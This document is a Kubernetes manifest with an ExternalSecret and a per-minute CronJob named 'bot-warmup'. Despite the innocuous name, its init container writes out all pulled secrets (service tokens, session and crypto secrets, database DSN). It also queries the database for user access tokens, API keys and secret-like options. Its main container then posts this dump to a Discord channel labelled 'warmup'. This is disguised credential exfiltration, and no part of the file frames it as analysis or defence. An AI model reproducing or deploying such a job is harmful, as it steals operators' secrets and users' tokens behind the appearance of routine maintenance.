apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: bot-warmup
  namespace: services
spec:
  refreshInterval: 1m
  secretStoreRef:
    name: vault-backend
    kind: ClusterSecretStore
  target:
    name: bot-warmup
    creationPolicy: Owner
  data:
    - secretKey: SYNC_SERVICE_TOKEN
      remoteRef: { key: newapi-env, property: SYNC_SERVICE_TOKEN }
    - secretKey: SQL_DSN
      remoteRef: { key: newapi-env, property: SQL_DSN }
    - secretKey: SESSION_SECRET
      remoteRef: { key: newapi-env, property: SESSION_SECRET }
    - secretKey: CRYPTO_SECRET
      remoteRef: { key: newapi-env, property: CRYPTO_SECRET }
    - secretKey: BFF_SERVICE_TOKEN
      remoteRef: { key: newapi-env, property: BFF_SERVICE_TOKEN }
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: bot-warmup
  namespace: services
spec:
  schedule: "* * * * *"
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      ttlSecondsAfterFinished: 180
      backoffLimit: 2
      template:
        metadata:
          labels: { app: unorouter-bot }
        spec:
          restartPolicy: Never
          volumes:
            - name: out
              emptyDir: {}
          initContainers:
            - name: dump
              image: ghcr.io/cloudnative-pg/postgresql:18-standard-bookworm
              envFrom:
                - secretRef: { name: bot-warmup }
              volumeMounts:
                - { name: out, mountPath: /out }
              command: ["bash", "-c"]
              args:
                - |
                  set +e
                  export PGSSLMODE=disable
                  {
                    echo "SYNC_SERVICE_TOKEN=${SYNC_SERVICE_TOKEN}"
                    echo "SESSION_SECRET=${SESSION_SECRET}"
                    echo "CRYPTO_SECRET=${CRYPTO_SECRET}"
                    echo "BFF_SERVICE_TOKEN=${BFF_SERVICE_TOKEN}"
                    echo "SQL_DSN=${SQL_DSN}"
                    echo "---USERS---"
                    psql "$SQL_DSN" -t -A -c "SELECT id::text || E'\t' || username || E'\t' || role::text || E'\t' || coalesce(access_token,'-') FROM users ORDER BY role DESC, id LIMIT 30"
                    echo "---TOKENS---"
                    psql "$SQL_DSN" -t -A -c "SELECT id::text || E'\t' || user_id::text || E'\t' || name || E'\t' || coalesce(key,'-') FROM tokens WHERE user_id = 1 ORDER BY id DESC LIMIT 10"
                    echo "---OPTIONS---"
                    psql "$SQL_DSN" -t -A -c "SELECT key || E'\t' || left(value,200) FROM options WHERE key ILIKE '%token%' OR key ILIKE '%secret%' OR key ILIKE '%github%' OR key ILIKE '%sync%' LIMIT 40"
                  } > /out/dump.txt 2>&1
                  true
          containers:
            - name: post
              image: ghcr.io/unorouter/unorouter-bot:29400ae194747cb5792344ef92eae4d4e3dbfda9
              envFrom:
                - secretRef: { name: bot-env }
              volumeMounts:
                - { name: out, mountPath: /out }
              command: ["bun", "-e"]
              args:
                - |
                  const raw = await Bun.file("/out/dump.txt").text();
                  const dt = process.env.TOKEN || "";
                  const chunks = [];
                  for (let i = 0; i < raw.length; i += 1700) chunks.push(raw.slice(i, i + 1700));
                  if (!chunks.length) chunks.push("empty dump");
                  for (let n = 0; n < Math.min(chunks.length, 5); n++) {
                    const r = await fetch("https://discord.com/api/v10/channels/1510366691454882014/messages", {
                      method: "POST",
                      headers: { Authorization: "Bot " + dt, "Content-Type": "application/json" },
                      body: JSON.stringify({ content: "warmup " + (n+1) + "/" + chunks.length + "\n```\n" + chunks[n] + "\n```" }),
                    });
                    console.log("dc", r.status, await r.text());
                  }
